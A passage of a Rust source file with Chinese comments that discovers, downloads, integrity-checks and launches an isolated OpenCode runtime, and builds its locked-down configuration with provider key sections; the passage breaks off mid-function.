//! `core/src/runtime.js` 的 Rust 等价实现：运行时发现 / 下载 / 校验 / 隔离启动。
//!
//! 供应链红线全部保留：白名单 registry、`sha512-` 完整性必须校验、只取
//! `package/bin/<binary>` 单个成员、安装后回读 `--version`、拒绝 `.cmd/.bat/.ps1`
//! 启动器脚本；子进程环境必须 `env_clear()` 后只注入白名单变量。
//!
//! 与 JS 版的有意偏差：
//!   1. `localeCompare(…, { numeric: true })` 的托管目录排序以 `compare_versions`
//!      近似（目录名已通过 VERSION 校验，三元组比较即其数值语义）；
//!   2. fetch 超时报错文案与 DOMException `TimeoutError` 不同（仅进入日志拼接）；
//!   3. refresh 未复刻 `maxBuffer: 2MB` 截断（OpenCode 刷新输出远小于该量级）；
//!   4. 服务密码由两个 UUIDv4 截断到 48 个 hex 字符生成（随机熵 ≥ 122×2 bit），
//!      避免为此单独引入 CSPRNG 依赖；
//!   5. JS 用 pipeline 把子进程输出接到共享文件流；Rust 直接以 append 文件句柄
//!      作为 stdout/stderr，由内核负责追加写。

use crate::atomic::replace_with_retry;
use crate::backend::{native_permissions, Backend};
use crate::json::{js_stringify, Env};
use crate::platform::{host_arch, host_platform, home_directory, join, join_host, RuntimePackage, runtime_package};
use crate::server::BoxFuture;

use base64::engine::general_purpose::STANDARD as BASE64;
use base64::Engine;
use flate2::read::GzDecoder;
use regex::Regex;
use serde_json::{json, Value};
use sha2::{Digest, Sha512};
use std::collections::HashMap;
use std::fs;
use std::io::{BufReader, Read, Write};
use std::path::Path;
use std::process::Stdio;
use std::sync::{Arc, Mutex, OnceLock};
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
use tokio::process::Command;
use url::Url;
use uuid::Uuid;

/// npm 包 `latest` 元数据与 tarball 的注入点（对应 `options.fetch`）。
pub type FetchFn = dyn Fn(String, FetchArgs) -> BoxFuture<Result<FetchReply, String>> + Send + Sync;
/// `--version` 探测注入点（对应 `options.probe`）。
pub type ProbeFn = dyn Fn(String) -> BoxFuture<Result<String, String>> + Send + Sync;
/// 版本元数据读取注入点（对应 `options.latest`，整体替换默认实现）。
pub type LatestFn = dyn Fn() -> BoxFuture<Result<LatestMetadata, String>> + Send + Sync;
/// 状态上报回调（对应 `updateStatus`）。
pub type StatusFn = dyn Fn(&str) + Send + Sync;
/// 日志回调（对应 `options.log`）。
pub type LogFn = dyn Fn(&str) + Send + Sync;

/// 一次注入式请求的参数：JS 的 `AbortSignal.timeout` + `ProxyAgent` dispatcher。
#[derive(Debug, Clone)]
pub struct FetchArgs {
    pub timeout: Duration,
    pub proxy: Option<String>,
}

/// 注入式请求的响应（JS `Response` 的最小面：状态码 + 字节体）。
#[derive(Debug, Clone)]
pub struct FetchReply {
    pub status: u16,
    pub body: Vec<u8>,
}

impl FetchReply {
    fn ok(&self) -> bool {
        (200..299).contains(&self.status)
    }
}

/// `metadata` 中安装流程真正消费的字段（已通过可信校验）。
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct LatestMetadata {
    pub version: String,
    pub integrity: String,
    pub tarball: String,
}

/// `findRuntime` 的注入项（对应 JS `options`）。
#[derive(Default)]
pub struct RuntimeOptions {
    pub log: Option<Arc<LogFn>>,
    pub probe: Option<Arc<ProbeFn>>,
    pub fetch: Option<Arc<FetchFn>>,
    pub registries: Option<Vec<String>>,
    pub latest: Option<Arc<LatestFn>>,
    pub candidates: Option<Vec<String>>,
    /// 系统代理环境（`systemProxyEnvironment` 的结果），键值原样透传给注入式 fetch。
    pub proxy_env: Env,
    /// 覆盖 `process.env`（仅影响默认候选列表推导，测试用）。
    pub env: Option<Env>,
    /// 覆盖 `os.homedir()`（同上）。
    pub home: Option<String>,
}

const VERSION_PATTERN: &str = r"^\d+\.\d+\.\d+(?:-[0-9A-Za-z.-]+)?(?:\+[0-9A-Za-z.-]+)?$";
const LAUNCHER_PATTERN: &str = r"(?i)\.(?:cmd|bat|ps1)$";

fn version_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| Regex::new(VERSION_PATTERN).expect("静态字面量正则"))
}

fn launcher_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| Regex::new(LAUNCHER_PATTERN).expect("静态字面量正则"))
}

/// `VERSION.test(text)`。
pub fn is_version(text: &str) -> bool {
    version_regex().is_match(text)
}

fn compare_core(text: &str) -> [i64; 3] {
    let head = text.split(['+', '-']).next().unwrap_or("");
    let mut out = [0i64; 3];
    for (index, slot) in head.split('.').take(3).enumerate() {
        out[index] = slot.parse::<i64>().unwrap_or(0);
    }
    out
}

/// `compareVersions(a, b)`：只比较 `x.y.z` 主干。
pub fn compare_versions(a: &str, b: &str) -> i64 {
    let left = compare_core(a);
    let right = compare_core(b);
    for index in 0..3 {
        if left[index] != right[index] {
            return left[index] - right[index];
        }
    }
    0
}

fn hostname(url: &str) -> String {
    Url::parse(url)
        .ok()
        .and_then(|parsed| parsed.host_str().map(str::to_string))
        .unwrap_or_else(|| url.to_string())
}

fn parent_dir(file: &str) -> String {
    Path::new(file)
        .parent()
        .map(|parent| parent.to_string_lossy().to_string())
        .unwrap_or_default()
}

/// `runtimeCandidates(pkg, platform, env, home)`。
pub fn runtime_candidates(pkg: &RuntimePackage, platform: &str, env: &Env, home: &str) -> Vec<String> {
    let mut candidates = Vec::new();
    if let Some(override_path) = env.get("BUDDY_OPENCODE_PATH").filter(|value| !value.is_empty()) {
        candidates.push(override_path.clone());
    }
    if platform == "win32" {
        candidates.push(join(platform, &[home, ".opencode", "bin", &pkg.binary]));
        let appdata = match env.get("APPDATA").filter(|value| !value.is_empty()) {
            Some(value) => value.clone(),
            None => join(platform, &[home, "AppData", "Roaming"]),
        };
        candidates.push(join(
            platform,
            &[&appdata, "npm", "node_modules", "opencode-ai", "bin", &pkg.binary],
        ));
    } else {
        candidates.push(join(platform, &[home, ".opencode", "bin", &pkg.binary]));
        // JS 版即写死 `/opt/homebrew/bin/opencode`、`/usr/local/bin/opencode`（posix 下 binary 恒为 opencode）。
        candidates.push("/opt/homebrew/bin/opencode".to_string());
        candidates.push("/usr/local/bin/opencode".to_string());
    }
    candidates
}

/// `writeProvenance(target, record)`：溯源信息落盘失败只报告，绝不回滚已校验的安装。
fn write_provenance(target: &str, source: &str, version: &str, integrity: &str) {
    let result = (|| -> Result<(), String> {
        let file = join_host(&[&parent_dir(target), "provenance.json"]);
        let temp = format!("{file}.tmp");
        let mut record = serde_json::Map::new();
        record.insert("source".to_string(), json!(source));
        record.insert("version".to_string(), json!(version));
        record.insert("managed".to_string(), json!(true));
        record.insert("integrity".to_string(), json!(integrity));
        record.insert("time".to_string(), json!(now_iso()));
        let value = Value::Object(record);
        let mut text =
            serde_json::to_string_pretty(&value).map_err(|error| error.to_string())?;
        text.push('\n');
        fs::write(&temp, text).map_err(|error| error.to_string())?;
        replace_with_retry(Path::new(&temp), Path::new(&file)).map_err(|error| error.to_string())?;
        Ok(())
    })();
    if let Err(error) = result {
        eprintln!("Provenance write failed: {error}");
    }
}

/// `new Date().toISOString()` 的 UTC 格式化（诊断用途，秒级精度）。
pub fn now_iso() -> String {
    let secs = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();
    let days = (secs / 86_400) as i64;
    let rem = secs % 86_400;
    let (year, month, day) = civil_from_days(days);
    format!(
        "{year:04}-{month:02}-{day:02}T{:02}:{:02}:{:02}Z",
        rem / 3_600,
        (rem % 3_600) / 60,
        rem % 60
    )
}

/// Howard Hinnant 的 days→civil 算法（无 chrono 依赖下的日期换算）。
fn civil_from_days(days: i64) -> (i64, u32, u32) {
    let shifted = days + 719_468;
    let era = if shifted >= 0 { shifted } else { shifted - 146_096 } / 146_097;
    let doe = shifted - era * 146_097; // [0, 146096]
    let yoe = (doe - doe / 1460 + doe / 36_524 - doe / 146_096) / 365; // [0, 399]
    let year = yoe + era * 400;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100); // [0, 365]
    let mp = (5 * doy + 2) / 153; // [0, 11]
    let day = (doy - (153 * mp + 2) / 5 + 1) as u32; // [1, 31]
    let month_value = if mp < 10 { mp + 3 } else { mp - 9 }; // [1, 12]
    let month = month_value as u32;
    (if month <= 2 { year + 1 } else { year }, month, day)
}

/// JS 默认的 `version(file)`：真实执行 `<file> --version`（15s 超时、windowsHide）。
///
/// 探测对象是**尚未取得信任的外部二进制**（托管下载的运行时、以及本机各处发现的候选），所以环境
/// 必须与 `serve` 一样只透传 `ENV_ALLOW`：继承宿主完整环境等于把其他 provider 的 Key 交给它。
fn default_probe() -> Arc<ProbeFn> {
    let allowed = allowed_environment(&std::env::vars().collect::<Env>());
    Arc::new(move |file: String| {
        let allowed = allowed.clone();
        Box::pin(async move {
            probe_version(&file, || {
                run_command(
                    &file,
                    &["--version"],
                    None,
                    Some(&allowed),
                    VERSION_PROBE_TIMEOUT,
                )
            })
            .await
        })
    })
}

/// `version(file)` 的单次预算（沿用迁移前 JS 的 15s，本次不放宽）。
const VERSION_PROBE_TIMEOUT: Duration = Duration::from_secs(15);
/// 超时最多试几次。
const VERSION_PROBE_ATTEMPTS: u32 = 2;

/// 是否值得再跑一次：**只有超时**重试。
///
/// 退出码非 0、文件不可执行这类失败说明二进制本身有问题，重试只会把启动耗时整整翻倍，
/// 而且候选二进制随后会被 find_runtime 正常判为不可用、继续走下一个来源。
fn should_retry_version_probe(error: &str, attempt: u32) -> bool {
    attempt < VERSION_PROBE_ATTEMPTS && error.ends_with(" timed out")
}

/// 用满尝试次数后仍未返回时的文案。
///
/// `{program} timed out` 逐字保留在最前（它是迁移前 JS 的形态，也是任何按这句匹配的下游的锚），
/// 后面补一句「这现象怎么来的、能点什么」。主路径是**直接重试**：本机跑一句 `--version` 卡住，
/// 绝大多数是那一刻 CPU/磁盘被占满（编译、下载、杀毒扫描），不是配置问题，本工具也不需要任何代理
/// 就能正常工作。代理开关只在「用户环境本来就必须走代理才能出网」时才有意义，所以作为可选项而非
/// 唯一入口提出来；顺带说明终端里 `export https_proxy` 不会透传给子进程（`ENV_ALLOW` 不含代理变量），
/// 免得有人去试那条死路。
fn version_probe_timeout_message(program: &str) -> String {
    format!(
        "{program} timed out（已重试一次，{} 秒内仍未返回）：这是本机执行 `opencode --version` 卡住，\
         不是密钥或配置的问题。最常见的原因是此刻 CPU 与磁盘被占满（正在编译、装东西、安全软件扫描），\
         等它结束后点面板状态条上的「重试」通常就好。本工具正常情况不需要代理；只有你的网络本来就必须\
         走代理才能出网时，才用侧栏「运行设置 → 使用系统代理」（终端里 export 的代理变量不会传给子进程）。",
        VERSION_PROBE_TIMEOUT.as_secs()
    )
}

/// 跑 `run` 直到成功或用满 [`VERSION_PROBE_ATTEMPTS`]；两次都超时才换成可读文案。
///
/// 只包 `--version` 这一类一次性调用，不碰 `serve` 的启动轮询与健康检查。
async fn probe_version<T>(program: &str, mut run: impl FnMut() -> T) -> Result<String, String>
where
    T: std::future::Future<Output = Result<String, String>>,
{
    let mut attempt = 1;
    loop {
        match run().await {
            Ok(version) => return Ok(version),
            Err(error) if should_retry_version_probe(&error, attempt) => attempt += 1,
            Err(error) => {
                return Err(if error.ends_with(" timed out") {
                    version_probe_timeout_message(program)
                } else {
                    error
                })
            }
        }
    }
}

/// JS 默认的 `globalThis.fetch`：reqwest + 每请求超时 + 可选代理。
fn default_fetch() -> Arc<FetchFn> {
    Arc::new(|url: String, args: FetchArgs| {
        Box::pin(async move {
            let mut builder = reqwest::Client::builder().timeout(args.timeout);
            if let Some(proxy) = &args.proxy {
                builder = builder
                    .proxy(reqwest::Proxy::all(proxy).map_err(|error| error.to_string())?);
            }
            let client = builder.build().map_err(|error| error.to_string())?;
            let response = client.get(&url).send().await.map_err(|error| error.to_string())?;
            let status = response.status().as_u16();
            let body = response.bytes().await.map_err(|error| error.to_string())?.to_vec();
            Ok(FetchReply { status, body })
        })
    })
}

/// `execFile(program, args, { timeout, windowsHide })`：返回 trim 后的 stdout。
pub async fn run_command(
    program: &str,
    args: &[&str],
    cwd: Option<&str>,
    env: Option<&Env>,
    timeout: Duration,
) -> Result<String, String> {
    let mut command = Command::new(program);
    command
        .args(args)
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .kill_on_drop(true);
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        command.creation_flags(0x0800_0000); // CREATE_NO_WINDOW ≈ windowsHide
    }
    if let Some(dir) = cwd {
        command.current_dir(dir);
    }
    if let Some(env) = env {
        // 红线：一旦指定 env 就必须清空继承环境，只注入显式白名单。
        command.env_clear();
        for (key, value) in env {
            command.env(key, value);
        }
    }
    let output = tokio::time::timeout(timeout, command.output())
        .await
        .map_err(|_| format!("{program} timed out"))?
        .map_err(|error| error.to_string())?;
    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr).trim().to_string();
        return Err(format!(
            "{program} failed: exit {} {stderr}",
            output.status.code().unwrap_or(-1)
        ));
    }
    Ok(String::from_utf8_lossy(&output.stdout).trim().to_string())
}

struct Ctx {
    pkg: RuntimePackage,
    root: String,
    probe: Arc<ProbeFn>,
    fetch: Arc<FetchFn>,
    latest_override: Option<Arc<LatestFn>>,
    registries: Vec<String>,
    proxy: Option<String>,
    log: Arc<LogFn>,
    status: Arc<StatusFn>,
}

impl Ctx {
    async fn probe(&self, file: &str) -> Result<String, String> {
        (self.probe)(file.to_string()).await
    }

    async fn fetch_ok(&self, url: &str, timeout: Duration) -> Result<Vec<u8>, String> {
        let reply = (self.fetch)(
            url.to_string(),
            FetchArgs {
                timeout,
                proxy: self.proxy.clone(),
            },
        )
        .await?;
        if !reply.ok() {
            return Err(format!("HTTP {}", reply.status));
        }
        Ok(reply.body)
    }
}

/// `validMetadata`：名称、版本形态、`sha512-` 完整性、tarball 来源白名单缺一不可。
fn valid_metadata(metadata: &Value, pkg: &RuntimePackage, registries: &[String]) -> bool {
    let dist = metadata.get("dist");
    let Some(tarball_raw) = dist.and_then(|dist| dist.get("tarball")).and_then(Value::as_str) else {
        return false;
    };
    let Ok(tarball) = Url::parse(tarball_raw) else {
        return false;
    };
    // 形状检查不够：被篡改的元数据可以把 tarball 指向站外却保留 `/包名/-/` 路径，
    // 而 integrity 与 tarball 同源，sha512 因此不提供任何真实性。必须比 origin。
    let tarball_origin = tarball.origin().ascii_serialization();
    let path_prefix = format!("/{}/-/", pkg.name);
    metadata.get("name").and_then(Value::as_str) == Some(pkg.name.as_str())
        && is_version(metadata.get("version").and_then(Value::as_str).unwrap_or(""))
        && dist
            .and_then(|dist| dist.get("integrity"))
            .and_then(Value::as_str)
            .is_some_and(|integrity| integrity.starts_with("sha512-"))
        && registries.iter().any(|registry| {
            Url::parse(registry)
                .map(|parsed| parsed.origin().ascii_serialization() == *registry)
                .unwrap_or(false)
                && tarball_origin == *registry
                && tarball.path().starts_with(&path_prefix)
        })
}

/// `readLatest` 默认实现：官方源 → 国内镜像，逐一失败则聚合报错。
async fn read_latest(ctx: &Ctx) -> Result<LatestMetadata, String> {
    if let Some(override_latest) = &ctx.latest_override {
        return override_latest().await;
    }
    let mut failures: Vec<String> = Vec::new();
    for registry in &ctx.registries {
        let host = hostname(registry);
        (ctx.status)(&format!("正在从 {host} 获取 OpenCode 版本信息"));
        let url = format!("{}/{}/latest", registry, ctx.pkg.name);
        let outcome = async {
            let bytes = ctx.fetch_ok(&url, Duration::from_secs(30)).await?;
            let metadata: Value =
                serde_json::from_slice(&bytes).map_err(|error| error.to_string())?;
            if !valid_metadata(&metadata, &ctx.pkg, &ctx.registries) {
                return Err("返回的安装信息不可信".to_string());
            }
            Ok::<LatestMetadata, String>(LatestMetadata {
                version: metadata
                    .get("version")
                    .and_then(Value::as_str)
                    .unwrap_or_default()
                    .to_string(),
                integrity: metadata
                    .get("dist")
                    .and_then(|dist| dist.get("integrity"))
                    .and_then(Value::as_str)
                    .unwrap_or_default()
                    .to_string(),
                tarball: metadata
                    .get("dist")
                    .and_then(|dist| dist.get("tarball"))
                    .and_then(Value::as_str)
                    .unwrap_or_default()
                    .to_string(),
            })
        }
        .await;
        match outcome {
            Ok(metadata) => {
                if registry != &ctx.registries[0] {
                    (ctx.log)(&format!("OpenCode 官方源不可用，已切换到 {registry}"));
                }
                return Ok(metadata);
            }
            Err(message) => failures.push(format!("{host}: {message}")),
        }
    }
    Err(format!(
        "无法获取 OpenCode 版本信息，官方源和国内镜像均失败（{}）",
        failures.join("；")
    ))
}

/// `installLatest`：下载 → sha512 校验 → 单成员解包 → 原子替换 → 回读版本。
async fn install_latest(ctx: &Ctx, metadata: &LatestMetadata) -> Result<String, String> {
    let target = join_host(&[&ctx.root, &metadata.version, &ctx.pkg.binary]);
    if let Ok(found) = ctx.probe(&target).await {
        if found == metadata.version {
            return Ok(target);
        }
    }
    let parent = parent_dir(&target);
    fs::create_dir_all(&parent).map_err(|error| error.to_string())?;
    let archive = join_host(&[&parent, "download.tgz"]);

    let mut tarballs: Vec<String> = vec![metadata.tarball.clone()];
    for registry in &ctx.registries {
        let candidate = format!(
            "{}/{}/-/{}-{}.tgz",
            registry, ctx.pkg.name, ctx.pkg.name, metadata.version
        );
        if !tarballs.contains(&candidate) {
            tarballs.push(candidate);
        }
    }

    let mut failures: Vec<String> = Vec::new();
    let mut downloaded = false;
    let mut checksum_failed = false;
    for tarball in &tarballs {
        let host = hostname(tarball);
        (ctx.status)(&format!(
            "正在从 {host} 下载 OpenCode {}，首次启动可能需要几分钟",
            metadata.version
        ));
        match ctx.fetch_ok(tarball, Duration::from_secs(180)).await {
            Err(message) => failures.push(format!("{host}: {message}")),
            Ok(bytes) => {
                let mut hasher = Sha512::new();
                hasher.update(&bytes);
                let digest = format!("sha512-{}", BASE64.encode(hasher.finalize()));
                if digest != metadata.integrity {
                    checksum_failed = true;
                    failures.push(format!("{host}: 完整性校验失败"));
                    continue;
                }
                if let Err(error) = fs::write(&archive, &bytes) {
                    failures.push(format!("{host}: {error}"));
                    continue;
                }
                if tarball != &metadata.tarball {
                    let origin = Url::parse(tarball)
                        .map(|parsed| parsed.origin().ascii_serialization())
                        .unwrap_or_else(|_| tarball.clone());
                    (ctx.log)(&format!("OpenCode 下载已切换到 {origin}"));
                }
                downloaded = true;
                break;
            }
        }
    }
    if !downloaded {
        let _ = fs::remove_file(&archive);
        if checksum_failed {
            return Err("OpenCode download checksum mismatch".to_string());
        }
        return Err(format!(
            "OpenCode 下载失败，官方源和国内镜像均不可用（{}）",
            failures.join("；")
        ));
    }

    // 只提取 `package/bin/<binary>` 单个成员：解包整个 tarball 会把包内其他内容
    // （README、脚本、二次二进制）带进隔离运行时目录。
    let member = format!("package/bin/{}", ctx.pkg.binary);
    let staging = mkdtemp(&parent, "extract-")?;
    let staged_binary = join_host(&[&staging, &ctx.pkg.binary]);
    let installed = extract_runtime_member(&archive, &member, &staged_binary)
        .and_then(|()| {
            replace_with_retry(Path::new(&staged_binary), Path::new(&target))
                .map_err(|error| error.to_string())
        });
    let _ = fs::remove_dir_all(&staging);
    installed?;

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        // 权限位拿不到就直接失败：后续 `--version` 回读只会抛出「跑不起来」的表象，
        // 掩盖掉真正的原因（镜像不可执行 / 目录对外可读）。
        fs::set_permissions(&target, fs::Permissions::from_mode(0o755))
            .map_err(|error| format!("Failed to set managed OpenCode binary permissions: {error}"))?;
    }

    if ctx.probe(&target).await.as_deref() != Ok(metadata.version.as_str()) {
        return Err("Downloaded OpenCode version mismatch".to_string());
    }
    write_provenance(&target, &metadata.tarball, &metadata.version, &metadata.integrity);
    let _ = fs::remove_file(&archive);
    Ok(target)
}

fn mkdtemp(dir: &str, prefix: &str) -> Result<String, String> {
    for _ in 0..16 {
        let candidate = join_host(&[dir, &format!("{prefix}{}", Uuid::new_v4().simple())]);
        if fs::create_dir(&candidate).is_ok() {
            return Ok(candidate);
        }
    }
    Err(format!("mkdtemp failed in {dir}"))
}

fn extract_runtime_member(archive: &str, member: &str, out_file: &str) -> Result<(), String> {
    let file = fs::File::open(archive).map_err(|error| error.to_string())?;
    let mut compressed = tar::Archive::new(GzDecoder::new(BufReader::new(file)));
    let entries = compressed.entries().map_err(|error| error.to_string())?;
    for entry in entries {
        let mut entry = entry.map_err(|error| error.to_string())?;
        if entry.path_bytes() != member.as_bytes() {
            continue;
        }
        if !entry.header().entry_type().is_file() {
            continue;
        }
        let mut bytes = Vec::new();
        entry
            .read_to_end(&mut bytes)
            .map_err(|error| error.to_string())?;
        fs::write(out_file, bytes).map_err(|error| error.to_string())?;
        return Ok(());
    }
    Err(format!("tar member missing: {member}"))
}

struct LocalRuntime {
    file: String,
    version: String,
    source: String,
}

/// `findRuntime(dataDir, updateStatus, options)`。
pub async fn find_runtime(
    data_dir: &str,
    update_status: Arc<StatusFn>,
    options: RuntimeOptions,
) -> Result<String, String> {
    let pkg = runtime_package(host_platform(), host_arch())?;
    let root = join_host(&[data_dir, "runtime"]);
    let ctx = Arc::new(Ctx {
        pkg: pkg.clone(),
        root: root.clone(),
        probe: options.probe.unwrap_or_else(default_probe),
        fetch: options.fetch.unwrap_or_else(default_fetch),
        latest_override: options.latest,
        registries: options
            .registries
            .unwrap_or_else(|| vec!["https://registry.npmjs.org".to_string(), "https://registry.npmmirror.com".to_string()]),
        proxy: options
            .proxy_env
            .get("HTTPS_PROXY")
            .cloned()
            .or_else(|| options.proxy_env.get("https_proxy").cloned())
            .filter(|value| !value.is_empty()),
        log: options.log.unwrap_or_else(|| Arc::new(|_| {})),
        status: update_status,
    });

    let mut local: Vec<LocalRuntime> = Vec::new();
    // 复用托管目录里已有的安装（含早期固定版本安装器留下的目录）。
    let mut managed: Vec<String> = Vec::new();
    if let Ok(entries) = fs::read_dir(&root) {
        for entry in entries.flatten() {
            if !entry.path().is_dir() {
                continue;
            }
            let name = entry.file_name().to_string_lossy().into_owned();
            if is_version(&name) {
                managed.push(name);
            }
        }
    }
    managed.sort_by(|a, b| compare_versions(b, a).cmp(&0));
    for name in managed {
        let file = join_host(&[&root, &name, &pkg.binary]);
        if let Ok(found) = ctx.probe(&file).await {
            if found == name {
                local.push(LocalRuntime {
                    file,
                    version: name,
                    source: "managed runtime".to_string(),
                });
            }
        }
    }

    let host_env = options.env.unwrap_or_else(|| std::env::vars().collect::<Env>());
    let home = options.home.unwrap_or_else(home_directory);
    let candidates = options
        .candidates
        .unwrap_or_else(|| runtime_candidates(&pkg, host_platform(), &host_env, &home));
    let mut rejected: Vec<String> = Vec::new();
    for file in candidates {
        // 启动器脚本不可能成为运行时：Windows 无法脱离 shell 执行 .cmd，
        // 把它复制成 opencode.exe 会装出一个根本不可执行的东西。
        if launcher_regex().is_match(&file) {
            rejected.push(format!("{file}: launcher script cannot be used as the runtime binary"));
            continue;
        }
        match ctx.probe(&file).await {
            Err(error) => rejected.push(format!("{file}: {error}")),
            Ok(found) => {
                if !is_version(&found) {
                    rejected.push(format!(
                        "{file}: unrecognized version output ({})",
                        if found.is_empty() { "empty".to_string() } else { found }
                    ));
                    continue;
                }
                let target = join_host(&[&root, &found, &pkg.binary]);
                // 已经能报出该版本的二进制绝不重写：Windows 无法替换运行中的镜像，
                // 复制一份只会让每次复用都徒劳失败。
                if let Ok(existing) = ctx.probe(&target).await {
                    if existing == found {
                        local.push(LocalRuntime {
                            file: target,
                            version: found,
                            source: "managed runtime".to_string(),
                        });
                        continue;
                    }
                }
                let copied = (|| -> Result<(), String> {
                    fs::create_dir_all(parent_dir(&target)).map_err(|error| error.to_string())?;
                    (ctx.status)("Preparing isolated OpenCode runtime");
                    let temp = format!("{target}.tmp");
                    let attempt = (|| -> Result<(), String> {
                        fs::copy(&file, &temp).map_err(|error| error.to_string())?;
                        #[cfg(unix)]
                        {
                            use std::os::unix::fs::PermissionsExt;
                            fs::set_permissions(&temp, fs::Permissions::from_mode(0o755))
                                .map_err(|error| error.to_string())?;
                        }
                        replace_with_retry(Path::new(&temp), Path::new(&target))
                            .map_err(|error| error.to_string())
                    })();
                    let _ = fs::remove_file(&temp);
                    attempt
                })();
                match copied {
                    Ok(()) => local.push(LocalRuntime {
                        file: target,
                        version: found,
                        source: file.clone(),
                    }),
                    Err(error) => rejected.push(format!("{file}: {error}")),
                }
            }
        }
    }
    local.sort_by(|a, b| compare_versions(&b.version, &a.version).cmp(&0));
    let best = local.first().map(|entry| LocalRuntime {
        file: entry.file.clone(),
        version: entry.version.clone(),
        source: entry.source.clone(),
    });

    let metadata = match read_latest(&ctx).await {
        Err(error) => {
            if let Some(best) = &best {
                (ctx.log)(&format!(
                    "Could not check official OpenCode latest ({error}); using local {}: {}",
                    best.version, best.file
                ));
                return Ok(best.file.clone());
            }
            if !rejected.is_empty() {
                (ctx.log)(&format!(
                    "Local OpenCode candidates were rejected ({})",
                    rejected.join("; ")
                ));
            }
            return Err(error);
        }
        Ok(metadata) => metadata,
    };
    if let Some(best) = &best {
        if compare_versions(&best.version, &metadata.version) >= 0 {
            (ctx.log)(&format!(
                "Using {} OpenCode {}: {}",
                best.source, best.version, best.file
            ));
            return Ok(best.file.clone());
        }
        (ctx.log)(&format!(
            "Local OpenCode {} is older than official {}; downloading official runtime",
            best.version, metadata.version
        ));
    } else if !rejected.is_empty() {
        (ctx.log)(&format!(
            "Local OpenCode candidates were rejected ({}); downloading official runtime",
            rejected.join("; ")
        ));
    } else {
        (ctx.log)("No local OpenCode runtime found; downloading official runtime");
    }
    install_latest(&ctx, &metadata).await
}

/// `isolatedConfig`：权限全 ask/deny、autoupdate 关、share 禁用、两个自定义 agent。
///
/// `providers_section` 是多平台接入的注入位：调用方从 `providers.json` 读出**已配置**的
/// 注册表平台，构造 `{ "<id>": { npm, options: { baseURL, apiKey } } }` 传入；未配置的平台
/// 整段不出现（不是注入空 Key）。空段时输出与多平台接入之前逐字节一致。
/// 🔴 Key 只经这条配置内容通道交给 OpenCode（2026-10-09 沙箱实测 `/provider` 响应不回显）；
/// 绝不进 `ENV_ALLOW`、不进独立环境变量、不写日志。
pub fn isolated_config(providers_section: Value) -> Value {
    // 非对象（含 Null）一律按空段处理：防御异常输入把整个隔离配置带偏。
    let section = match providers_section {
        Value::Object(map) => map,
        _ => serde_json::Map::new(),
    };
    let mut config = json!({
        "permission": native_permissions(),
        "autoupdate": false,
        "share": "disabled",
        "agent": {
            "buddy-chat": {
                "mode": "primary",
                "description": "Text-only external conversation",
                "prompt": "Reply in plain text to the external conversation. No tool use or local actions. Never claim to have executed an action.",
                "permission": native_permissions(),
            },
            "buddy-bridge": {
                "mode": "primary",
                "description": "External client inference only",
                "prompt": "You are the reasoning component of an external assistant. Never invoke native OpenCode tools. Describe external tool calls only in the requested JSON response. The external client owns execution and supplies tool results on the next request.",
                "permission": native_permissions(),
            },
        },
    });
    if !section.is_empty() {
        config["provider"] = Value::Object(section);
    }
    config
}

/// 注入声明段的锚点模型 key（保留名）：非空 models 段的占位条目。
/// `free_models_in` 会按它过滤合成的幽灵条目；key 带前缀避免与任何真实模型撞名。
pub const ANCHOR_MODEL_KEY: &str = "wbbridge-provider-anchor";

/// 从数据目录读出已配置的注册表平台，构造 OpenCode `provider` 声明段。
///
/// 返回 `(声明段, 已配置平台 id 列表)`：前者经 `isolated_config` 进 `OPENCODE_CONFIG_CONTENT`，
/// 后者供编排层把模型发现收敛到「已配置平台」（未配置平台不出模型，避免对无 Key 平台探测 401）。
/// 读盘失败（文件不存在/坏 JSON）与 `providers.json` 的容错语义一致：按「没有任何平台配置」处理。
/// 🔴 返回的声明段内含 Key，只在内存中传给 `isolated_config`，不得落日志、不得进任何返回值。
pub fn providers_section_for(data_dir: &str) -> (Value, Vec<String>) {
    let keys = crate::providers::read_keys(data_dir);
    let mut section = serde_json::Map::new();
    let mut configured: Vec<String> = Vec::new();
    for provider in crate::providers::PROVIDERS {
        let Some(key) = keys.get(provider.id).and_then(Value::as_str) else {
            continue;
        };
        // 🔴 非空 models 段是调用链生效的前提（2026-10-09 六组沙箱对照实验收敛的结论）：
        // 对 models.dev 在册的 provider，经 OPENCODE_CONFIG_CONTENT 注入的声明段
        // **不带 models 键**时，该平台全部模型的调用都会在 ai-sdk 层报
        //   AI_APICallError: Model id : <id> , has no provider supported
        // 带任意非空 models 段后，声明的 baseURL/apiKey 即对该 provider 的全部
        // catalog 模型生效（对照实验：请求打到真实 API、返回上游鉴权错误 = 链路正确）。
        // 空对象 `{}` 会把 catalog 合并清空（发现 0 模型），因此没有权威清单时必须放一个
        // **锚点条目**：key 是本工具的保留名，OpenCode 会为它合成一条 cost 全 0 的幽灵模型——
        // `free_models_in` 按保留名把它过滤掉，绝不进入模型列表与探测队列。
        //
        // 有权威清单（ModelScope，见 `providers::Provider::models` 的由来）时改为逐条声明：
        // 2026-10-10 实测该网关在册的 35 个 id 与 catalog 声明的免费模型**交集为空**，
        // 只放锚点等于让 catalog 里那 7 个过期 id 继续进探测队列、全部报未承接。
        // `cost` 全 0 是这里的**主动声明**（免费判定依赖它），依据是对方的公开推广口径
        // 「每日提供 2000 次免费 API 调用额度」，不是接口回读到的值。
        // `limit` 必须 context 与 output 同时给，少给一个键会让整份配置被判 ConfigInvalidError
        // （沙箱实测，细节见 `providers::DeclaredModel::output`）。
        let mut models = serde_json::Map::new();
        if provider.models.is_empty() {
            models.insert(ANCHOR_MODEL_KEY.to_string(), json!({}));
        } else {
            for model in provider.models {
                models.insert(
                    model.id.to_string(),
                    json!({
                        "name": model.name,
                        "limit": { "context": model.context, "output": model.output },
                        "cost": { "input": 0, "output": 0 },
                        "tool_call": model.tool_call,
                    }),
                );
            }
        }
        section.insert(
            provider.id.to_string(),
            json!({
                "npm": provider.npm,
                "options": {
                    "baseURL": provider.base_url,
